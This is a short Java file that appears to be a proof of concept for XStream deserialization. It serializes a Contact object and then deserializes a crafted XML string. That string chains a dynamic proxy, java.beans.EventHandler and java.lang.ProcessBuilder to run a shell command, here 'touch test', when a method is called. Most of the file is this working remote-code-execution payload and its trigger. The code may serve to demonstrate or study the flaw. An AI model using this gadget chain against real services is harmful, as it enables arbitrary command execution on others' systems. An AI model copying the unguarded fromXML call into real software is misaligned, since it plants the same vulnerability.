import java.io.File;
import java.io.IOException;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import lib.Contact;
import lib.ContactImpl;

public class Main {
  public static void main(String[] args) throws IOException {
    XStream xstream = new XStream(new DomDriver());
    ContactImpl contact = new ContactImpl();
    String contactXml = xstream.toXML(contact);
    ContactImpl contactFromXml = (ContactImpl) xstream.fromXML(contactXml);

    // String contactXmlNew = xstream.toXML(new ContactImpl());
    // System.out.println(contactXmlNew);

    String xml = "<lib.ContactImpl>\n"
    + "<dynamic-proxy>\n"
      + "<interface>lib.Contact</interface>"
        + "<handler class='java.beans.EventHandler'>"
          + "<target class='java.lang.ProcessBuilder'>"
            + "<command><string>touch test</string></command>"
          + "</target>"
          + "<action>start</action>"
        + "</handler>"
      + "</dynamic-proxy>"
    + "</lib.ContactImpl>";

    Contact c = (Contact)xstream.fromXML(xml);
    System.out.println(c.getFullname());
  }
}